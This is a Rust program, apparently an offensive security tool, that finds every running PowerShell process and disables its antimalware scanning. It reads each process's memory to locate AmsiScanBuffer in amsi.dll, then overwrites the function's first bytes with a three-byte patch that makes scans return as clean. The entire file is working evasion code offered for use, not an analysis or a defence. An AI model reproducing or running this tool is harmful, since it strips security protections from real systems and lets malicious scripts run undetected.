use std::ffi::c_void;
use std::mem::size_of;

use windows::core::Result;
use windows::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Module32FirstW, Module32NextW, MODULEENTRY32W, TH32CS_SNAPMODULE,
    TH32CS_SNAPMODULE32,
};
use windows::Win32::System::Memory::{
    VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    OpenProcess, PROCESS_ALL_ACCESS, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
};

const PATCH_PAYLOAD: &[u8] = &[
    0x29, 0xC0,
    0xC3,
];

unsafe fn write_buffer(handle: HANDLE, address: usize, buffer: &[u8]) -> bool {
    let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);

    if VirtualProtectEx(
        handle,
        address as *const c_void,
        buffer.len(),
        PAGE_READWRITE,
        &mut old_protect,
    )
    .is_err()
    {
        eprintln!("[-] VirtualProtectEx Error: {}", windows::core::Error::from_win32());
        return false;
    }

    let mut bytes_written = 0;
    let result = WriteProcessMemory(
        handle,
        address as *const c_void,
        buffer.as_ptr() as *const c_void,
        buffer.len(),
        Some(&mut bytes_written),
    )
    .is_ok()
        && bytes_written == buffer.len();

    if !result {
        eprintln!("[-] WriteProcessMemory Error: {}", windows::core::Error::from_win32());
    }

    let _ = VirtualProtectEx(
        handle,
        address as *const c_void,
        buffer.len(),
        old_protect,
        &mut old_protect,
    );

    result
}

unsafe fn read_memory(handle: HANDLE, address: usize, size: usize) -> Option<Vec<u8>> {
    let mut buffer = vec![0u8; size];
    let mut bytes_read = 0;
    if ReadProcessMemory(
        handle,
        address as *const c_void,
        buffer.as_mut_ptr() as *mut c_void,
        size,
        Some(&mut bytes_read),
    )
    .is_ok()
        && bytes_read >= size
    {
        buffer.truncate(bytes_read);
        Some(buffer)
    } else {
        None
    }
}

unsafe fn read_memory_exact(handle: HANDLE, address: usize, size: usize) -> Option<Vec<u8>> {
    let mut buffer = vec![0u8; size];
    let mut bytes_read = 0;
    if ReadProcessMemory(
        handle,
        address as *const c_void,
        buffer.as_mut_ptr() as *mut c_void,
        size,
        Some(&mut bytes_read),
    )
    .is_ok()
        && bytes_read == size
    {
        Some(buffer)
    } else {
        None
    }
}

unsafe fn get_amsi_scan_buffer_address(
    handle: HANDLE,
    base_address: usize,
    _module_size: usize,
) -> Option<usize> {
    let header = read_memory(handle, base_address, 0x1000)?;
    
    if header.len() < 2 || &header[0..2] != b"MZ" {
        return None;
    }
    
    if header.len() < 0x40 {
        return None;
    }
    let e_lfanew = u32::from_le_bytes(header[0x3C..0x40].try_into().unwrap()) as usize;
    
    if e_lfanew + 4 > header.len() || &header[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return None;
    }
    
    let optional_header_offset = e_lfanew + 4 + 20;
    
    let required_size = optional_header_offset + 120;
    let full_header = if header.len() < required_size {
        read_memory_exact(handle, base_address, required_size)?
    } else {
        header
    };
    
    if full_header.len() < required_size {
        return None;
    }
    
    let export_rva = u32::from_le_bytes(
        full_header[optional_header_offset + 112..optional_header_offset + 116]
            .try_into()
            .unwrap(),
    ) as usize;
    
    if export_rva == 0 {
        return None;
    }
    
    let export_dir_addr = base_address + export_rva;
    let export_dir = read_memory_exact(handle, export_dir_addr, 40)?;
    
    parse_export_directory(handle, base_address, export_dir)
}

unsafe fn parse_export_directory(
    handle: HANDLE,
    base_address: usize,
    export_dir: Vec<u8>,
) -> Option<usize> {
    let number_of_functions = u32::from_le_bytes(export_dir[20..24].try_into().unwrap()) as usize;
    let number_of_names = u32::from_le_bytes(export_dir[24..28].try_into().unwrap()) as usize;
    let address_of_functions_rva = u32::from_le_bytes(export_dir[28..32].try_into().unwrap()) as usize;
    let address_of_names_rva = u32::from_le_bytes(export_dir[32..36].try_into().unwrap()) as usize;
    let address_of_name_ordinals_rva =
        u32::from_le_bytes(export_dir[36..40].try_into().unwrap()) as usize;
    
    if number_of_names == 0 {
        return None;
    }
    
    let names_addr = base_address + address_of_names_rva;
    let names = read_memory_exact(handle, names_addr, number_of_names * 4)?;
    
    let functions_addr = base_address + address_of_functions_rva;
    let functions = read_memory_exact(handle, functions_addr, number_of_functions * 4)?;
    
    let ordinals_addr = base_address + address_of_name_ordinals_rva;
    let ordinals = read_memory_exact(handle, ordinals_addr, number_of_names * 2)?;
    
    for i in 0..number_of_names {
        let name_rva = u32::from_le_bytes(names[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
        let name_addr = base_address + name_rva;
        
        let name_buffer = read_memory_exact(handle, name_addr, 64)?;
        let name_end = name_buffer.iter().position(|&b| b == 0).unwrap_or(64);
        let name = String::from_utf8_lossy(&name_buffer[..name_end]);
        
        if name == "AmsiScanBuffer" {
            let ordinal = u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
            if ordinal >= number_of_functions {
                continue;
            }
            let func_rva = u32::from_le_bytes(
                functions[ordinal * 4..ordinal * 4 + 4].try_into().unwrap(),
            ) as usize;
            return Some(base_address + func_rva);
        }
    }
    
    None
}

unsafe fn patch_amsi_scan_buffer(handle: HANDLE, func_address: usize) -> bool {
    write_buffer(handle, func_address, PATCH_PAYLOAD)
}

unsafe fn get_amsi_dll_base_address(handle: HANDLE, pid: u32) -> Option<usize> {
    let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid) {
        Ok(s) if s != INVALID_HANDLE_VALUE => s,
        _ => return None,
    };

    let mut me32 = MODULEENTRY32W::default();
    me32.dwSize = size_of::<MODULEENTRY32W>() as u32;

    if Module32FirstW(snapshot, &mut me32).is_err() {
        let _ = CloseHandle(snapshot);
        return None;
    }

    loop {
        let mod_name = utf16_to_string(&me32.szModule);
        let mod_name_lower = mod_name.to_lowercase();

        if mod_name_lower == "amsi.dll" {
            println!(
                "[+] Found base address of {}: {:#x} (size: {} bytes)",
                mod_name,
                me32.modBaseAddr as usize,
                me32.modBaseSize
            );

            let result = get_amsi_scan_buffer_address(
                handle,
                me32.modBaseAddr as usize,
                me32.modBaseSize as usize,
            );
            let _ = CloseHandle(snapshot);
            return result;
        }

        if Module32NextW(snapshot, &mut me32).is_err() {
            break;
        }
    }

    let _ = CloseHandle(snapshot);
    None
}

fn utf16_to_string(buf: &[u16]) -> String {
    let len = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    String::from_utf16_lossy(&buf[..len])
}

fn get_powershell_pids() -> Vec<u32> {
    use std::process::Command;

    let output = match Command::new("tasklist")
        .args(["/fi", "imagename eq powershell.exe", "/fo", "csv"])
        .output()
    {
        Ok(o) => o,
        Err(_) => return Vec::new(),
    };

    let output_str = String::from_utf8_lossy(&output.stdout);
    let lines: Vec<&str> = output_str.lines().skip(1).collect();
    
    let mut pids = Vec::new();
    for line in lines {
        let parts: Vec<&str> = line.split(',').collect();
        if parts.len() > 1 {
            if let Ok(pid) = parts[1].trim_matches('"').parse::<u32>() {
                pids.push(pid);
            }
        }
    }
    
    pids
}

fn main() -> Result<()> {
    let pids = get_powershell_pids();

    if pids.is_empty() {
        println!("[-] No PowerShell processes found");
        return Ok(());
    }

    for pid in pids {
        unsafe {
            let process_handle = match OpenProcess(
                PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                false,
                pid,
            ) {
                Ok(h) => h,
                Err(_) => continue,
            };

            println!(
                "[+] Got process handle of PID powershell at {}: {:#x}",
                pid, process_handle.0 as usize
            );
            println!("[+] Trying to find AmsiScanBuffer in {} process memory...", pid);

            if let Some(amsi_dll_base_address) = get_amsi_dll_base_address(process_handle, pid) {
                println!(
                    "[+] Trying to patch AmsiScanBuffer found at {:#x}",
                    amsi_dll_base_address
                );

                if !patch_amsi_scan_buffer(process_handle, amsi_dll_base_address) {
                    eprintln!("[-] Error patching AmsiScanBuffer in {}.", pid);
                    eprintln!("[-] Error: {}", windows::core::Error::from_win32());
                    let _ = CloseHandle(process_handle);
                    continue;
                } else {
                    println!("[+] Success patching AmsiScanBuffer in PID {}", pid);
                }
            } else {
                eprintln!("[-] Error finding AmsiDllBaseAddress in {}.", pid);
                eprintln!("[-] Error: {}", windows::core::Error::from_win32());
                let _ = CloseHandle(process_handle);
                continue;
            }

            let _ = CloseHandle(process_handle);
            println!();
        }
    }

    Ok(())
}
